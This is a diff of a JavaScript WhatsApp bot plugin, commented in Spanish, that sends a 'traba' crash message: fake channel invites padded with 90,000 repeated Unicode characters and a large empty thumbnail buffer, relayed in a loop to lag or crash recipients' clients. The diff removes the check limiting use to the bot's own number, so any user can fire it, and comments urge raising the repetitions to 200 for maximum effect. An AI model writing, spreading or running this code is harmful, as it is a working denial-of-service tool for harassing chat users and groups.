@@ -1,13 +1,9 @@
 let handler = async (m, { conn }) => {
-  // Comparar solo los números sin el dominio para asegurar coincidencia
-  const senderNumber = m.sender.split('@')[0];
-  const botNumber = conn.user.id.split('@')[0];
-
-  if (senderNumber !== botNumber) return m.reply(`❌ *SOLO EL NÚMERO DEL BOT PUEDE USAR ESTE COMANDO*`);
+  // 🔴 Se eliminó la restricción de número del bot
 
   const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
   const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
-  const channelJid = '120363999999999999@g.us'; // Modifica si deseas otro canal real
+  const channelJid = '120363999999999999@g.us'; // Puedes modificar por otro canal real
   const thumbnailFake = Buffer.alloc(90000);
 
   const fakeInviteContent = {
@@ -34,7 +30,7 @@ let handler = async (m, { conn }) => {
   };
 
   // Puedes ajustar cuántas veces se envía aquí
-  for (let i = 0; i < 5; i++) { // cambia 5 por 200 si quieres efecto completo
+  for (let i = 0; i < 5; i++) { // Cambia 5 por 200 para máximo efecto
     await conn.relayMessage(
       m.chat,
       {
@@ -66,7 +62,7 @@ let handler = async (m, { conn }) => {
     );
   }
 
-  m.reply('✅ *Traba canal enviada por el bot correctamente.*');
+  m.reply('✅ *Traba canal enviada correctamente.*');
 };
 
 handler.command = ["lagcanalplus", "canalcrash", "traba2"];
